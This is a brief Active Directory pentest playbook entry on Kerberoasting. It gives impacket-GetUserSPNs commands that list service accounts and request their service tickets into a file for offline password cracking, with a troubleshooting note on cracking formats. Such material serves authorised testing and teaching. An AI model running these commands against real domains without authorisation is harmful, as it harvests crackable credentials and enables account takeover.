## List service accounts before requesting tickets

**Run in:** Kali. **Requires:** Working domain credentials and DC connectivity; the password is prompted.

```bash
impacket-GetUserSPNs 'DOMAIN_FQDN/USER' -dc-ip DC_IP
```

**What the result establishes:** Separate listing accounts with SPNs from requesting service tickets for offline analysis.

**Next check:** Choose a relevant account and verify its context before separately requesting a service ticket for offline analysis.

## Commands

**Kali**

```bash
impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile tickets.txt
```

## If it fails

| Symptom | Check |
| --- | --- |
| An SPN listing is mistaken for a recovered credential | The returned ticket artifact is not a plaintext password; account encryption, privileges, domain reachability and the selected cracking format affect the next step. |
